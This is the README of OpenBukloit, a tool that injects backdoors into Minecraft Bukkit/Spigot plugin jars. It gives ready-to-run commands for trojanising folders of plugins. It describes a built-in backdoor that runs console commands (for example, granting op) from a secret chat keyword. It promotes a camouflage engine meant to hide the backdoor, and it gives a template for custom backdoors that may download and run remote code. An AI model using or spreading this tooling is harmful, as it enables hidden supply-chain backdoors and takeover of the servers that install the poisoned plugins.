<div align="center"><h1>OpenBukloit - Minecraft plugin backdoor injector</h1></div>

<div align="center"><img alt="Logo" src="logo.png"/></div>

<div align="center">
    <img alt="Open issues" src="https://img.shields.io/github/issues-raw/Voxelhax/OpenBukloit"/>
    <img alt="Code size" src="https://img.shields.io/github/languages/code-size/Voxelhax/OpenBukloit"/>
    <a href="https://www.codefactor.io/repository/github/voxelhax/openbukloit"><img alt="CodeFactor" src="https://www.codefactor.io/repository/github/voxelhax/openbukloit/badge"/></a>
</div>

<div align="center">
    <a href="https://github.com/Voxelhax/OpenBukloit/releases/latest"><img alt="Download" src="https://img.shields.io/badge/-DOWNLOAD_LATEST_RELEASE_(CLICK)-blue?style=for-the-badge"/></a>
</div>

<br>

<hr>

**OpenBukloit** is modern and powerful universal backdoor injector compatible with all Bukkit/Spigot/Paper/etc plugins. Its feature is ability to integrate with absolutely any plugin without the need to modify backdoor every time. Moreover, it provides powerful camouflage engine, which makes nearly impossible to find it without sufficient knowledge or advanced automated tools. OpenBukloit was developed to test the security systems of Minecraft servers, Voxelhax team is not responsible for its misuse.

This is a continuation of **[Bukloit](https://github.com/Rikonardo/Bukloit)** project, taking into account all the problems of the previous project and a completely different approach to development.

## OpenBukloit features
- **Full support for Bukkit and it's forks on any Minecraft version.**
- **Custom backdoor support.**
- **Automatic JDK downloading, so you don't need to care about Java version compatibility.**
- **Powerful camouflage engine, which makes it harder to find backdoor in plugin.**

## Installation
In order to use OpenBukloit you must have any Java version installed (but not lower than 8). Then download OpenBukloit jar from [releases tab](https://github.com/Voxelhax/OpenBukloit/releases/latest).

## Usage
To run OpenBukloit, open command prompt in the directory where OpenBukloit jar is located. Then type:

```sh
java -jar OpenBukloit.jar
```

Here you can pass some arguments to configure injector and backdoor:

| Short Argument | Long Argument | Description                                                                                                                                                                  | Type  |
|----------------|---------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------|
| -e             | --exploit     | Path to custom .java or compiled .class file, that will be used as backdoor.<br />**By default uses builtin backdoor.**                                                      |
| -m             | --mode        | Mode. Can be single/multiple.<br />**Default: <ins>multiple</ins>.**<br />In multiple mode, modifies all files in the specified folder. In single - only the specified file. | Value |
| -i             | --input       | Path to input folder/file (mode dependent).<br />**Default: <ins>in</ins> (<ins>in.jar</ins> if mode is single).**                                                           | Value |
| -o             | --output      | Path to output folder/file (mode dependent).<br />**Default: <ins>out</ins> (<ins>out.jar</ins> if mode is single).**                                                        | Value |
| -r             | --replace     | Replace output file if it already exists.                                                                                                                                    | Flag  |

But these arguments are not enough to run OpenBukloit. You must also specify backdoor params. Because OpenBukloit supports injecting of custom backdoors, you must pass additional arguments that required by used backdoor.

## Builtin exploit

By default, OpenBukloit injects builtin backdoor. It is a simple backdoor that allows you to execute any commands as console by writing special keyword before command in chat.

Builtin backdoor params:

| Long Argument | Description                                       |
|---------------|---------------------------------------------------|
| --key         | Keyword, that triggers console command execution. |

Ingame usage for key set to "hackthisserver":

```
hackthisserver op MyName
```

This message sent to chat will be executed as console command and give op to MyName player.

**Here is some examples of using OpenBukloit with builtin backdoor:**

1. Patch all .jar files with the "#console" key from the "in" folder and save them into the "out" folder without replacement.

```sh
java -jar OpenBukloit.jar -m multiple -i "in" -o "out" --key "#console"
```

2. Patch all files with the "hacktheserver" key from the "in" folder and save them into the "out" folder with replacement.

```sh
java -jar OpenBukloit.jar -m multiple -i "in" -o "out" --key "hacktheserver" -r
```

3. Patch single file "PluginName.jar" with "#console" key and save it as "Output.jar" file with replacement.

```sh
java -jar OpenBukloit.jar -m single -i "PluginName.jar" -o "Output.jar" --key "#console" -r
```

## Writing custom exploit

You can also write your own backdoor. It should be a class with `public static void inject(JavaPlugin args)` method (JavaPlugin is from Bukkit API).

Here is a simple example:

```java
import org.bukkit.plugin.java.JavaPlugin;

public class MyBackdoor {
    public static void inject(JavaPlugin args) {
        System.out.println("Hello, world!");
    }
}
```

`inject` method will be executed after plugin's `onEnable` method. You can do everything you want here, including downloading and running some arbitrary code from internet.

But you must know that there are some limitations:
- Currently, you can't use nested classes, there is must be only one class in exploit file.
- You shouldn't reference your exploit class inside it, like using it as method params, as a return value or as a field type.

You can take external params from command line, by using %placeholders%:

```java
import org.bukkit.plugin.java.JavaPlugin;

public class MyBackdoor {
    public static void inject(JavaPlugin args) {
        System.out.println("Hello, %name%!");
    }
}
```

And then inject it with command:

```sh
java -jar OpenBukloit.jar -e MyBackdoor.java --name world
```

Note, that we can pass our backdoor to OpenBukloit without compiling, and it will automatically compile it with Spigot API in compiletime classpool.